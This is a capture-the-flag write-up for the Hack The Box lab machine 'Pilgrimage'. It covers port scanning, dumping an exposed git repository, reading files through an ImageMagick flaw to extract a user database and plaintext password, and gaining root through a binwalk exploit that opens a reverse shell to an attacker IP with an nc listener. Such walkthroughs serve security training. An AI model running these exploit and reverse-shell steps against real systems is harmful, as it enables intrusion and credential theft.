---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Pilgrimage

## Enumeration

### Nmap

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-14 07:26 EDT
Nmap scan report for 10.10.11.219
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds

nmap -p- -A -T4 10.10.11.219
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-14 15:40 CEST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds
```

## Web

Using **Dirbuster**. we find git repository!

```
dirb http://pilgrimage.htb/
```

`.git` present, yields 403

#### git-dumper

https://github.com/arthaud/git-dumper

```
git-dumper http://pilgrimage.htb/.git dumped
```

### Source code

By analysing the source code, we find magick binary, that is invoked for the conversion.

#### magick

It is a vulnerable version. It allows reading of arbirtrary file.

Rust exploit:

```
https://github.com/voidz0r/CVE-2022-44268
```

Python exploit: able to exfiltrate the SQlite DB:

```
https://github.com/Sybil-Scan/imagemagick-lfi-poc7
```

Exfiltrate /var/db/pilgrimage:

```
$ python ./generate.py -f '/var/db/pilgrimage' -o var_db_pilgrimage.png
$ wget http://pilgrimage.htb/shrunk/file.png
$ identify -verbose file.png > sqlite.hex
    - edit to remove garbage
$ python
    inf = open('sqlite.hex')
    data = inf.read()
    data2 = bytes.fromhex(data)
    outf = open('sqlite.db', 'wb')
    outf.write(data2)
    outf.close()
$ sqlite sqlite.db
    .schema
    SELECT * FROM users;
```

User credentials: `emily:abigchonkyboi123`

## Root

Running pspy64 found interesing sctipt. `/usr/sbin/malwarescan.sh`

It runs like this. Meaing when an image is uploaded, it runs the script on the **converted** image.

```
2023/07/15 00:04:38 CMD: UID=33    PID=1134   | /bin/bash /tmp/.mount_magick6msrNU/AppRun convert /var/www/pilgrimage.htb/tmp/64b155f6221d64.06303899_fomnqhlgpikej.png -resize 50% /var/www/pilgrimage.htb/shrunk/64b155f62227b.png 
2023/07/15 00:04:38 CMD: UID=0     PID=1139   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/15 00:04:38 CMD: UID=0     PID=1138   | /usr/bin/tail -n 1 
2023/07/15 00:04:38 CMD: UID=0     PID=1137   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/15 00:04:38 CMD: UID=0     PID=1136   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/15 00:04:38 CMD: UID=0     PID=1140   | /usr/bin/python3 /usr/local/bin/binwalk -e /var/www/pilgrimage.htb/shrunk/64b155f62227b.png 
```

By analysing the script we found call to binwalk. And that has an exploit. `https://github.com/adhikara13/CVE-2022-4510-WalkingPath`

```
python3 walkingpath.py reverse image.jpeg 10.10.16.29 7777 
# It outputs the binwalk_exploit.png
```

* You then upload the binwalk_exploit.png to the server
* launch listener `nc -lvnp 7777`
* now you need to copy the file to the /var/www/pilgrimage.htb/shrunk/, which triggets the /usr/sbin/malwarescan.sh

```
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png
```

....and you are root